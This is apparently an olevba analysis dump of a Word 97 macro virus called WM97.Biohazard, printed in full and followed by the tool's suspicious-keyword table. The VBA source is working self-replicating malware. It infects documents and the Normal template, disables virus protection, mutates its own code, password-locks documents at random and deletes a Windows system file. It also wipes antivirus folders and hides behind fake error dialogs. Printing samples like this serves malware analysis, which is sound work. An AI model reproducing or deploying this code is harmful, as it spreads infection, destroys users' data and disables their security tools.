olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ultras.Biohazard
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ultras.Biohazard - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Biohazard.bas 
in file: ./Virus.MSWord.Ultras.Biohazard - OLE stream: 'Macros/VBA/Biohazard'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**********************************************************************
'*                      WM97.BIOHAZARD BY ULTRAS
'*                           [Rioters Group]
'**********************************************************************
Sub AutoOpen()
On Error Resume Next
PolyMorphic
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
For b = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(b).Name = "Biohazard" Then
DocInfect = True
End If
Next
For U = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(U).Name = "Biohazard" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Biohazard", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Biohazard", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
End Sub

Sub FileTemplates()
beep
End Sub

Sub ToolsMacro()
beep
Msgbox "Not enough memory to perform this operation", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
End Sub


Sub ToolsCustomize()
beep
End Sub

Sub ViewVBCode()
beep
Msgbox "Not enough memory to perform this operation", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
End Sub

Sub PolyMorphic()
On Error Resume Next
Biohazard
Set Engine = MacroContainer
PoNu = Int(Rnd() * 20 + 1)
For Mutate = 1 To PoNu
PoNuG = Engine.VBProject.VBComponents("Biohazard").CodeModule.ProcCountLines("PolyMorphic", vbext_pk_Proc)
PoRL = Int(Rnd() * PoNuG + 1)
PoRNL = Int(Rnd() * 40 + 1)
For PoL = 1 To PoRNL
PoR = PoR + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next PoL
Engine.VBProject.VBComponents("Biohazard").CodeModule.InsertLines PoRL, vbTab & "REM " & PoR
PoR = ""
Next Mutate
End Sub

Sub Biohazard()
On Error Resume Next
U = Int(Rnd() * 30) + 1
If Day(Now()) = U Then
For i = 1 To 15
LiVe = Int(Rnd() * (90 - 16) + 16)
PoBi = PoBi + Chr$(LiVe)
Next
ActiveDocument.Password = PoBi
ActiveDocument.Save
End If
If Day(Now()) = 9 Then
SetAttr "c:\Windows\System\vmm32.vxd", 0
Kill "c:\Windows\System\vmm32.vxd"
Do
Msgbox "You Infected Biohazard by ULTRAS" & vbCrLf & "[Rioters Group]", vbCritical + vbOKOnly, "ULTRAS"
Loop
End If
KillAV
End Sub

Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Tbavw95\*.*"
Kill "C:\Vdoc\*.*"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

